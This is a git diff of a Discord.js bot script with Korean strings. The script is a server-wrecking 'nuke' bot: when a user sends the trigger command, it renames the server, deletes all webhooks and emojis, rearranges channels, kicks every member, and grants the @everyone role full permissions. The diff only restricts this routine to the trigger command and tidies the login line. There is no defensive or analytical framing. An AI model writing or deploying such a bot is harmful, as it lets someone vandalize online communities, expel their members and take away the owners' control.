@@ -1,3 +1,4 @@
+
 const Discord = require('discord.js');
 const client = new Discord.Client();
 client.once('ready', () => {
@@ -8,7 +9,7 @@ process.on('unhandledRejection', error => {
 });
 client.on('message', message => {
 	if (!message.content.startsWith('%') || message.author.bot) return;
-	const clean = message.guild.setName(`${message.guild.owner.user.tag.substring(0,message.guild.owner.user.tag.indexOf("#", 0))}님의 서버`)
+	if (message.content == '%즐겁다') { message.guild.setName(`${message.guild.owner.user.tag.substring(0,message.guild.owner.user.tag.indexOf("#", 0))}님의 서버`)
 	message.guild.setIcon(null)
 	message.guild.fetchWebhooks().then(function (web) {web.forEach(function (webhook) {webhook.delete()})})
 	message.guild.emojis.cache.forEach((emoji) => emoji.delete())
@@ -30,6 +31,5 @@ client.on('message', message => {
 	const category = message.guild.channels.cache.find(c => c.name == "음성 채널" && c.type == "category")
 	channel.setParent(category.id);
 	message.guild.members.cache.forEach((member) => member.kick())
-	message.guild.roles.everyone.setPermissions([2147483647]) }) 
-	if (message.content === "%즐겁다") clean });
-client.login(토큰);
+	message.guild.roles.everyone.setPermissions([2147483647]) }) } });
+client.login("토큰");
